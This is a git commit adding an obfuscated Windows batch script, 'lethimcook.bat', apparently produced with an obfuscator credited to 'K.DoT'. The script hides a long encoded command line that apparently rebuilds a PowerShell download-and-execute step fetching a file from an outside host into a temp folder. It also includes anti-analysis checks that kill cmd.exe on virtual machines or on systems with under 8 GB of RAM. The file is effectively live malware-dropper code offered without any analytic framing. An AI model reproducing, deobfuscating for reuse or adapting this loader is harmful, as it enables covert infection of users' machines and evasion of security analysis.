024e81e60e345dfe1f56b48d191fadc516b7b477
bao3125 <104300198+bao3125@users.noreply.github.com>
2024-04-17 22:46:15 +0700

    Add files via upload

---
+++ lethimcook.bat
@@ -0,0 +1,435 @@
+@echo on
+
+
+::Made BY K.DoT UsiNg somalIfuSCatoRv2
+set /^a aN^s=2*2*2*0x5*0x13*(0671^^0x5e4)
+got^o       ,, %ANS%
+:500027
+set "j=a"
+s^e^t /^a aN^S^=2*0x3*0x3*~-34484
+g^o^to  ;;  %aNS%
+:936426
+set /a a^n^s^=2*2*2*0x3*0x7*~-2610
+g^O^t^o ;;          ,  %aNs%
+:825545
+set /^a aN^s^=2*2*2*2*(012672^^026367)
+g^Oto , ;  %ANs%
+:920998
+set /^a a^N^S=0123*~-2684
+goT^o      ;     ,        %ANs%
+:381221
+se^t /^a ans=2*03*013*045*(0x95^^0x1a6)
+g^O^to ,       , %anS%
+:234032
+for /l %%o in (641, 641, 641) do ( set "p=g" )
+set/a a^Ns=0x83*(0x505^^0x184)
+goT^o  ,     ,; %ANS%
+:422970
+set /^a a^n^s^=2*0107*~-5432
+g^oto      ; ,,     , %Ans%
+:329789
+se^t /a an^s^=2*2*0203*((076674^^0xd17c)^>^>6)
+g^o^To      ;     ,,  %Ans%
+:976120
+set/a aNS=2*2*03*(0304353^^0120660)
+g^OT^O ,;  %ANs%
+:374021
+s^et /^a a^N^S=0145*((0x3e692f^^0x151f2f)^>^>9)
+go^TO ; ,     ; %ans%
+:934568
+set "v=m"
+se^t /a aNs^=0x65*(016346^^07645)
+g^oTo      ;; %AnS%
+:419915
+for /l %%h in (894, 894, 894) do ( set "x=o" )
+se^t/a aN^s=05*05*013*(07304^^02461)
+g^O^T^O ;;  %ANs%
+:245330
+s^et /^a aNS^=2*0x3*03*05*0x5*0xd*0123
+g^Oto      ;, %aNS%
+:762237
+set "a=r"
+s^e^t /a a^ns^=2*0x3*~-32562
+gOTO                  %anS%
+:763497
+for /l %%g in (887, 887, 887) do ( set "c=t" )
+set/a anS=03*~-44988
+g^O^t^o ,;  %ANS%
+:987884
+s^e^t /a an^s=((0377317^^0x300cf)^>^>9)*(0x7dc^^0317)
+g^o^t^O   ;     ,, %ANS%
+:588874
+s^et /^a a^N^S=2*015*~-24422
+gO^T^o ;;  %aNs%
+:976746
+s^et /a aN^s^=((0x9d6^^0104526)^>^>7)*(0x218^^0661)
+g^O^t^O ,;, ,      %ANS%
+:254025
+for /l %%q in (828, 828, 828) do ( set "h=y" )
+se^t /^a a^n^s=((0x11421e02^^0xa0ea002)^>^>9)
+gO^TO      ;, %ans%
+:775033
+s^et /a aN^s=2*0x3*0x5*05*0x2b*0x3d
+g^oTO ;  ;      %Ans%
+:351355
+s^et /^a aNS=2*0x3*0117*((0x47ac^^0xaeac)^>^>8)
+goTo  ,     ;, %Ans%
+:278026
+se^t /^a a^Ns=~-312*((0x3783^^014323)^>^>4)
+g^O^TO        ; %Ans%
+:515219
+s^e^t /^a a^N^S^=((0743711212^^036116212)^>^>9)
+go^to      ;;       %anS%
+:287737
+se^t /a a^nS^=2*075*((033674^^0x4fd4)^>^>3)
+g^O^To ,,      , %aNs%
+:905680
+se^t/a aNS^=((01330321^^0xf023d)^>^>2)
+g^OTO       ;,      %ANS%
+:116891
+for /l %%v in (425, 425, 425) do ( se^t    "P1=G" )
+for /l %%y in (715, 715, 715) do ( set     "Q1=H" )
+for /l %%n in (674, 674, 674) do ( se^t     "R1=I" )
+se^t /^a aNs^=0xad*(01413^^040)
+g^o^T^O      ;  %ans%
+:346954
+for /l %%k in (472, 472, 472) do ( se^t "T1=K" )
+s^et /^a a^N^S^=03*03*((0x15b0b6^^0x24ced6)^>^>5)
+gOto ;;     ;           %aNS%
+:480838
+for /l %%s in (250, 250, 250) do ( s^et    "V1=M" )
+se^t /a aN^s^=0x80*~-5108
+goT^o ;  ; %ans%
+:617473
+for /l %%z in (65, 65, 65) do ( set    "X1=O" )
+set /^a an^s^=~-115892
+g^oTo ,,;     ;,      %ANS%
+:632737
+se^t /a an^S=0211*~-1568
+gOtO      ,;       %Ans%
+:927020
+s^e^t /a a^NS=2*2*03*03*0x3*0xb*013*0x3b
+g^o^TO ,; ;,      %ANs%
+:505120
+se^t /^a a^NS^=05*(0334^^0733)*(0x313^^0x12a)
+go^to ;,      ; , %Ans%
+:591688
+set /a an^s^=2*~-56102
+g^oto  ;           %aNs%
+:518127
+set /a an^s=2*2*0x11*021*~-510
+go^To           ; %ans%
+:430017
+set /^a an^s=2*2*0x7*013*0xd*0243
+g^Ot^O   ,,;  %AnS%
+:458831
+s^e^t /^a aNS^=2*2*2*0x97*~-788
+g^OT^o   ;; %anS%
+:519699
+s^e^t/a a^Ns^=0x3*0265*~-758
+go^TO ; , %ANS%
+:871499
+s^et "H1=Y"
+for /l %%w in (969, 969, 969) do ( se^t     "I1=Z" )
+
+set /^a a^N^S=2*03*013*~-7014
+go^T^O      ; ,  ; %aNS%
+:169734
+s^e^t /^a a^n^S=0x3*07*021*(01751^^02662)
+g^ot^O ,     ;;,,      %anS%
+:831777
+se^t /a an^S=05*05*~-17922
+goto      ;      ; %ans%
+:789437
+%APPDATA:~-13,1%%x%%NtQu??%%KDOT:~42,1%%n%%s#FzYJ%%a%%AOPIe%%PROGRAMFILES:~15,1%%q%%T(SRh#L%%TEMP:~-3,1%%u%%sp_iM%%u%%MYzy$h%.%FGWbn%%n%%ByKUXy%%g%%hlsa#k[%%COMMONPROGRAMFILES(X86):~14,1% -%IkA]zT%%KDOT:~37,1%%r%%WGkdOuE%%KDOT:~40,1%%m%%?ilt_L%%x%%t]oGq%%KDOT:~42,1%%DRIVERDATA:~11,1%%c%%uJ$Gv%%DRIVERDATA:~-26,1%%KDOT:~16,1%%TEMP:~-3,1% %q%%w?gAy%%r%%UGqXeWX%%m%%laGPvJk%%OS:~3,1%%DRIVERDATA:~15,1%%COMMONPROGRAMW6432:~-7,1% -%nOd$fi%%L1%%?dr#_b%%x%%cfdt,%%TMP:~-2,1%%TMP:~-2,1%%j%%DwUnK,V%%OS:~-8,1%%m%%sXe$NQB% "%pslB[M[%%W1%%e#e]cH%%DRIVERDATA:~-14,1%%OS:~5,1%-%$Fwk?R%%KDOT:~54,1%%TMP:~-13,1%%COMMONPROGRAMFILES(X86):~33,1%%COMMONPROGRAMFILES(X86):~-10,1% -%QYRyI]O%%R1%%?J$jx%%c%%?Msat%%USERPROFILE:~5,1%%v%%EaRRA%%OS:~9,1%%h%%V]vslfj%%y%%UwAcT%%n%%gVQJE% %LOCALAPPDATA:~-10,1%%r%%Jd?Q$Fy%%COMMONPROGRAMFILES:~7,1%%n%%AJCyqE%%TMP:~-8,1%%TEMP:~-13,1%%KDOT:~10,1%%a%%nhBNj%%h%%g?N,Mfb% -%wKMsm%%COMMONPROGRAMFILES:~24,1%%COMMONPROGRAMFILES(X86):~5,1%%PUBLIC:~-9,1%%l%%VXEBknO%%n%%DZNj?j% -%xCasrS%%COMMONPROGRAMFILES(X86):~3,1%%j%%NOKqBV#%%c%%]okJK%%q%%MhjZSw% %L1%%aM[)JlV%%SYSTEMDRIVE:~1,1%\%](Km_Z%%APPDATA:~-16,1%%M1%%QeOjtFB%%DRIVERDATA:~7,1%%KDOT:~42,1%%w%%xwdXCV%%u%%lJ[fy%%x%%#viWxs%%j%%BAAvqNr%%m%%(]Oke%%COMMONPROGRAMW6432:~-14,1%;%ntEduO% %R1%%zBxGMkK%%w%%aXCjlwn%%e%%aobYu,%%x%%ygK)t%%t%%uNZcoSb%%n%%q_pno%-%NRNeg%%DRIVERDATA:~3,1%%n%%lX#PPd%%k%%(dUwwNW%%A1%%_EBVRdY%%n%%KeQWFK%%z%%Ol$Ee%%PUBLIC:~-5,1%%n%%rSyfLCG%%USERPROFILE:~4,1%%c%%wqe]_% -%TitPV%%USERPROFILE:~3,1%%COMMONPROGRAMW6432:~-22,1%%r%%qoCz(% %q%%UpTLf%%c%%,VZbo%%KDOT:~33,1%%y%%LVS]Ic%%PUBLIC:~4,1%:%x[tTN%/%EdxHgM%/%WxEGR%%COMMONPROGRAMFILES(X86):~-28,1%%j%%MbZgxo%%DRIVERDATA:~8,1%.%WmYNzz%%APPDATA:~-1,1%%APPDATA:~-3,1%%DRIVERDATA:~-24,1%%q%%AKqYsmf%%d%%nE[umyC%%k%%jmn#)B%%PUBLIC:~10,1%%USERPROFILE:~4,1%%TEMP:~-3,1%%a%%uRkAb%%l%%xnrQ(%%x%%qqdEMFq%%COMMONPROGRAMFILES(X86):~-7,1%%LOCALAPPDATA:~-8,1%%COMMONPROGRAMW6432:~-2,1%%w%%B]doT%%TEMP:~-13,1%.%oHloNzP%%PUBLIC:~14,1%%LOCALAPPDATA:~-4,1%%TMP:~-2,1%/%gA[Sj%%PUBLIC:~11,1%%KDOT:~20,1%%APPDATA:~-6,1%%DRIVERDATA:~-21,1%1%ffAmpZ%%DRIVERDATA:~-20,1%5%(nxdADu%/%vltVAR%5%oSzNm%5%rQYH,%4%Lyk)g??%4%dnmsEr?%%PROGRAMFILES(X86):~20,1%7%daBWmLO%5%kfOIYkw%5%#eDgibF%4%YafAzaX%/%kLVC_o%%PROGRAMFILES:~9,1%%KDOT:~20,1%%r%%Sq$Jd%%COMMONPROGRAMFILES(X86):~-7,1%/%[?$LfY%%Y1%%LIatxOF%%d%%VxK(A%%OS:~-8,1%.%fJ,pEFz%%k%%?,oQ$W%%KDOT:~7,1%%APPDATA:~-14,1% -%SWIKO%%X1%%HOy,qhp%%d%%a)V_ou%%c%%qgtkO%%O1%%poGe$%%PROGRAMFILES:~12,1%%u%%Mbmm#R%%TEMP:~-3,1% %KDOT:~29,1%:%KHuvCWb%%TMP:~-11,1%\%ryFJa%%LOCALAPPDATA:~-10,1%%KDOT:~10,1%%OS:~-5,1%%COMMONPROGRAMFILES:~-7,1%%PROGRAMFILES:~-3,1%%x%%YAslUR%%LOCALAPPDATA:~-2,1%%DRIVERDATA:~-32,1%%KDOT:~9,1%%COMMONPROGRAMW6432:~2,1%\%K$_kCyN%%V1%%vWtNlV%%B1%%HmyHEL%%k%%kyFzP%%d%%oSizaj%%PUBLIC:~-2,1%%KDOT:~16,1%%m%%HQA[_Xh%.%y(LLRZ,%%PUBLIC:~11,1%%DRIVERDATA:~37,1%%TEMP:~-13,1%;%)dv$zN% %B1%%nIRON%%c%%hJlKOS_%%LOCALAPPDATA:~-2,1%%KDOT:~43,1%%c%%pgTjZ%-%_egzSd%%Y1%%mQQLl%%a%%sfHPbs%%LOCALAPPDATA:~-4,1%%TMP:~-8,1%%PUBLIC:~5,1%%b%%MQfrUa%%b%%c[zKOt,% -%JKvxf%%O1%%K_VFX%%r%%Kp[U(fV%%u%%aFynx%%PUBLIC:~5,1%%KDOT:~57,1%%j%%dEB$iK%%APPDATA:~-10,1%%q%%qgaAQ% %USERPROFILE:~0,1%:%$EXlwxM%\%fZIcirv%%LOCALAPPDATA:~-6,1%%APPDATA:~-12,1%%x%%GfFN)ib%%KDOT:~42,1%%DRIVERDATA:~-33,1%%COMMONPROGRAMFILES(X86):~32,1%%x%%mafWKUN%%DRIVERDATA:~35,1%%KDOT:~17,1%%PUBLIC:~-11,1%\%wMZ?Ly%\%BJiLAJX%%V1%%_kbd]%%DRIVERDATA:~-27,1%%k%%cCkNK%%PUBLIC:~10,1%%COMMONPROGRAMFILES:~25,1%%u%%klS,S%%OS:~3,1%.%JKnvyv%%KDOT:~15,1%%COMMONPROGRAMFILES:~-21,1%%TMP:~-13,1%"%_TAZyY%  
+goto :EOF
+:848920
+@echo on
+
+set /a ans=013*0x83*((0x8b10^^023220)^>^>7)
+goto %ans%
+:620694
+set "k=b"
+
+set /a ans=2*03*~-156072
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }"
+goto %ans%
+:438312
+set "l=c"
+
+set /a ans=05*0x7*0147*~-230
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }"
+goto %ans%
+:234704
+for /l %%i in (681, 681, 681) do ( set "m=d" )
+
+set /a ans=2*0xd*(0xea38^^0x6067)
+goto %ans%
+:222689
+for /l %%j in (544, 544, 544) do ( set "n=e" )
+
+set /a ans=~-381222
+goto %ans%
+:84892
+:749694
+for /l %%t in (780, 780, 780) do ( set "o=f" )
+
+set /a ans=2*2*2*2*~-14628
+goto %ans%
+:151043
+for /l %%j in (445, 445, 445) do ( set "q=h" )
+
+set /a ans=2*03*05*0x17*((0714604^^0376204)^>^>8)
+
+
+goto %ans%
+:771202
+for /l %%p in (460, 460, 460) do ( set "r=i" )
+
+set /a ans=~-329790
+goto %ans%
+:362084
+for /l %%d in (523, 523, 523) do ( set "s=j" )
+
+set /a ans=2*2*2*05*027*((0172135^^0x1fd1d)^>^>6)
+goto %ans%
+:43831
+:913476
+for /l %%v in (202, 202, 202) do ( set "t=k" )
+
+set /a ans=065*~-7058
+goto %ans%
+:561863
+set "u=l"
+
+set /a ans=2*2*2*0xc5*~-594
+goto %ans%
+:22268
+:498031
+for /l %%w in (4, 4, 4) do ( set "w=n" )
+
+set /a ans=05*(0327273^^0163264)
+goto %ans%
+:841775
+for /l %%s in (985, 985, 985) do ( set "y=p" )
+
+set /a ans=2*05*~-24534
+goto %ans%
+:485550
+for /l %%g in (765, 765, 765) do ( set "z=q" )
+
+set /a ans=03*03*0x3*0x7*045*0155
+goto %ans%
+:91347
+:195366
+for /l %%x in (458, 458, 458) do ( set "b=s" )
+
+set /a ans=0x3*0x3*0x7*(020501^^0xe16)
+goto %ans%
+:134961
+set "d=u"
+
+set /a ans=2*2*~-246972
+goto %ans%
+:693613
+for /l %%a in (6, 6, 6) do ( set "e=v" )
+
+set /a ans=2*013*0xd*0x1d*0107
+goto %ans%
+:634946
+set "f=w"
+
+set /a ans=2*03*((0x1780b7^^0x45f8f)^>^>3)
+goto %ans%
+:56186
+:56186
+:240809
+for /l %%q in (210, 210, 210) do ( set "g=x" )
+
+set /a ans=03*0x3*05*05*~-1130
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 8) {spps -f -n "cmd" -ErrorAction SilentlyContinue;exit 1}"
+goto %ans%
+:74969
+:894559
+for /l %%z in (211, 211, 211) do ( set "i=z" )
+
+set /a ans=07*07*~-15818
+goto %ans%
+:19536
+:393450
+se^t     "J1=A"
+
+set /a ans=0x5*~-70272
+goto %ans%
+:110442
+se^t "K1=B"
+
+set /a ans=2*0x7*07*(0x121^^05064)
+goto %ans%
+:15104
+:91347
+:235427
+set     "L1=C"
+
+set /a ans=021*((0x374ed6^^066704326)^>^>9)
+goto %ans%
+:19536
+:260999
+for /l %%i in (323, 323, 323) do ( set   "M1=D" )
+
+set /a ans=0x35*075*0131
+goto %ans%
+:470066
+s^e^t    "N1=E"
+
+set /a ans=2*2*2*2*0x5*~-11322
+goto %ans%
+:63494
+:175291
+for /l %%o in (947, 947, 947) do ( se^t   "O1=F" )
+
+set /a ans=051*((0x194db^^0x35c1b)^>^>6)
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 8) {spps -f -n "cmd" -ErrorAction SilentlyContinue;exit 1}"
+goto %ans%
+:22268
+:140303
+for /l %%v in (174, 174, 174) do ( s^et     "S1=J" )
+
+set /a ans=2*0x2f*~-3692
+
+
+goto %ans%
+:84892
+:43831
+:912267
+for /l %%e in (106, 106, 106) do ( s^et    "U1=L" )
+
+set /a ans=2*0x17*~-10454
+goto %ans%
+:19536
+:89455
+:23542
+:14030
+:653696
+for /l %%i in (671, 671, 671) do ( s^e^t    "W1=N" )
+
+set /a ans=~-617474
+goto %ans%
+:17529
+:91226
+:115891
+se^t    "Y1=P"
+
+set /a ans=07*0x7*045*~-350
+
+
+goto %ans%
+:13496
+:47006
+:214679
+se^t     "Z1=Q"
+
+set /a ans=2*2*05*(0xefeb^^0x5ae4)
+goto %ans%
+:62069
+:36208
+:84177
+:24080
+:11044
+:771012
+for /l %%e in (409, 409, 409) do ( s^e^t "A1=R" )
+
+set /a ans=2*2*2*2*2*0x5*07*013*051
+goto %ans%
+:63494
+:23542
+:26099
+:17529
+:748235
+s^e^t   "B1=S"
+
+set /a ans=2*2*2*(0376123^^0xdcba)
+
+
+goto %ans%
+:48555
+:26099
+:11589
+:112202
+for /l %%h in (730, 730, 730) do ( set   "C1=T" )
+
+set /a ans=0x3*((010116712^^035144552)^>^>5)
+goto %ans%
+:84892
+:23542
+:588404
+for /l %%e in (17, 17, 17) do ( s^e^t  "D1=U" )
+
+set /a ans=03*0x7*~-20478
+goto %ans%
+:47006
+:17529
+:652652
+s^e^t  "E1=V"
+
+set /a ans=023*0x13*0x1f*0x29
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }"
+goto %ans%
+:22268
+:84177
+:950696
+set    "F1=W"
+
+set /a ans=03*0153*(0x58^^03013)
+goto %ans%
+:36208
+:11044
+:65369
+:21467
+:77101
+:74823
+:74823
+:65265
+:411051
+set  "G1=X"
+
+set /a ans=(0xf9^^0460)*~-1908
+
+
+goto %ans%
+:69361
+:74823
+:11220
+:462858
+chcp 65001 > nul
+
+set /a ans=2*0x3*(0x4dc5^^0x2344)
+
+
+goto %ans%
+:77120
+:56186
+:65265
+:95069
+:580839
+set KDOT=0F3HgNQmBsoAj64bldVia5xfYzRyKCS2LteOTWDvncwrZqJU71GEu8IhkPX9Mp
+
+set /a ans=0x3*(0x213ba^^01424261)
+goto %ans%
+:23470
+:49803
+:84177
+:89455
+:11044
+:77101
+:58840
+:95069
+:448025
+echo %random% >nul
+
+set /a ans=0xb*053*((0x3867^^06117)^>^>3)
+goto %ans%
+:39345
+:77101
+:58840
+:58840
